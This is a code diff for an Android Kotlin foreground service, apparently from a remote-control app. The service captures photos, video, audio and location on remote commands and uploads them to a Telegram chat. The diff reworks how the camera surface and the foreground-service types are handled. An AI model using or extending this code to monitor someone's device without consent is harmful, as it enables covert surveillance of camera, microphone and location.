@@ -7,18 +7,25 @@ import android.media.AudioManager
 import android.media.RingtoneManager
 import android.os.*
 import android.util.Log
+import android.view.SurfaceHolder
 import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
+import android.content.pm.ServiceInfo
+
+object ServiceHolder {
+    var surfaceHolder: SurfaceHolder? = null
+    var isRunning: Boolean = false
+}
 
 class ForegroundActionService : Service() {
-    private var overlayView: OverlayCameraView? = null
     private var job: Job? = null
 
     override fun onCreate() {
         super.onCreate()
         Log.d("ForegroundActionService", "onCreate called")
+        ServiceHolder.isRunning = true
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -47,7 +54,11 @@ class ForegroundActionService : Service() {
                     UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $action: ${formatDateTime(System.currentTimeMillis())}.")
                 }
             } finally {
-                withContext(Dispatchers.Main) { removeCameraOverlay() }
+                if (Build.VERSION.SDK_INT >= 34) {
+                    OverlayHelper.removeOverlay(this@ForegroundActionService)
+                    ServiceHolder.surfaceHolder = null
+                }
+                ServiceHolder.isRunning = false
                 stopSelf()
             }
         }
@@ -55,17 +66,21 @@ class ForegroundActionService : Service() {
     }
 
     private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?) {
-        withContext(Dispatchers.Main) { showCameraOverlay() }
         val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
         val flash = intent?.getBooleanExtra("flash", false) ?: false
         val quality = intent?.getIntExtra("quality", 720) ?: 720
         val duration = intent?.getIntExtra("duration", 60) ?: 60
         val outputFile = File(cacheDir, generateFileName(type, quality))
         val actionTimestamp = System.currentTimeMillis()
+        val surfaceHolder = ServiceHolder.surfaceHolder
+        if (surfaceHolder == null) {
+            Log.e("ForegroundActionService", "SurfaceHolder is null for $type")
+            return
+        }
         val result: Boolean = try {
             CameraBackgroundHelper.takePhotoOrVideo(
                 context = this,
-                surfaceHolder = overlayView!!.holder,
+                surfaceHolder = surfaceHolder,
                 type = type,
                 cameraFacing = cameraFacing,
                 flash = flash,
@@ -78,10 +93,8 @@ class ForegroundActionService : Service() {
                 val deviceNickname = Preferences.getNickname(this) ?: "Device"
                 UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $type: ${e.localizedMessage} at ${formatDateTime(actionTimestamp)}.")
             }
-            withContext(Dispatchers.Main) { removeCameraOverlay() }
             return
         }
-        withContext(Dispatchers.Main) { removeCameraOverlay() }
         if (result && chatId != null) {
             UploadManager.queueUpload(outputFile, chatId, type, actionTimestamp)
         } else if (!result && chatId != null) {
@@ -166,43 +179,48 @@ class ForegroundActionService : Service() {
         }
     }
 
-    private fun showCameraOverlay() {
-        if (overlayView == null) {
-            overlayView = OverlayCameraView(this)
-            overlayView?.addToWindow()
-        }
-    }
-    private fun removeCameraOverlay() {
-        overlayView?.removeFromWindow()
-        overlayView = null
-    }
     override fun onDestroy() {
         job?.cancel()
-        removeCameraOverlay()
+        if (Build.VERSION.SDK_INT >= 34) {
+            OverlayHelper.removeOverlay(this)
+            ServiceHolder.surfaceHolder = null
+        }
+        ServiceHolder.isRunning = false
         super.onDestroy()
     }
+
     override fun onBind(intent: Intent?): IBinder? = null
 
-    /**
-     * Show notification and start foreground with the correct type for the action.
-     * For vibrate/ring/other, fallback to camera.
-     */
     private fun showNotificationForAction(action: String) {
         val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
             .setContentTitle("Remote Control Service")
             .setContentText("Running background actions...")
             .setSmallIcon(android.R.drawable.ic_menu_camera)
             .build()
-        // Use only types declared in the manifest (camera|microphone|location).
-        val type = when (action) {
-            "photo", "video" -> 0x00000001 // camera
-            "audio" -> 0x00000004 // microphone
-            "location" -> 0x00000002 // location
-            // For vibrate, ring, or any other: fallback to "camera" (cannot use NONE on Android 14+)
-            else -> 0x00000001 // camera
-        }
+        val type =
+            when (action) {
+                "photo", "video" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                "audio" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                "location" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                else -> 0
+            }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(1, notification, type)
+            if (type != 0) {
+                try {
+                    startForeground(1, notification, type)
+                } catch (e: SecurityException) {
+                    Log.e("ForegroundActionService", "SecurityException: ${e.message}")
+                    if (Build.VERSION.SDK_INT >= 34) {
+                        OverlayHelper.removeOverlay(this)
+                        ServiceHolder.surfaceHolder = null
+                    }
+                    ServiceHolder.isRunning = false
+                    stopSelf()
+                    return
+                }
+            } else {
+                startForeground(1, notification)
+            }
         } else {
             startForeground(1, notification)
         }
@@ -220,18 +238,25 @@ class ForegroundActionService : Service() {
         fun stop(context: Context) {
             context.stopService(Intent(context, ForegroundActionService::class.java))
         }
-        fun isRunning(context: Context): Boolean = false
+        fun isRunning(context: Context): Boolean = ServiceHolder.isRunning
 
-        fun startCameraAction(context: Context, type: String, options: JSONObject, chatId: String?) {
+        fun startCameraAction(
+            context: Context,
+            type: String,
+            options: JSONObject,
+            chatId: String?,
+            surfaceHolder: SurfaceHolder? = null
+        ) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", type)
             intent.putExtra("camera", options.optString("camera", "rear"))
             if (options.has("flash")) intent.putExtra("flash", options.optBoolean("flash", false))
-            if (type == "video") {
+            if (type == "video" || type == "photo") {
                 if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
                 if (options.has("duration")) intent.putExtra("duration", options.optInt("duration", 60))
             }
             chatId?.let { intent.putExtra("chat_id", it) }
+            ServiceHolder.surfaceHolder = surfaceHolder
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
